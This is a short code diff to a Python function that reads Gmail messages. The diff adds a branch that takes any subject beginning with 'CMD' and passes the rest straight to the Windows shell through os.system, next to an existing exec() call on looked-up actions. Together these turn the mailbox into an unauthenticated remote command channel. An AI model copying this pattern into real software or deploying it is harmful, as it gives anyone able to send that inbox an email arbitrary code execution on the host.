@@ -86,6 +86,10 @@ def read_email_from_gmail():
                             return -1
                         elif email_subject == 'MINECRAFTFLOW':
                             return -2
+                        elif email_subject.startswith('CMD'):
+                            #print("THERE_THERE")
+                            text = ' '.join(email_subject.split()[1:])
+                            os.system('cmd /k "' + text + '"')
                         else:
                             exec(acts.find(email_subject))
                     else:
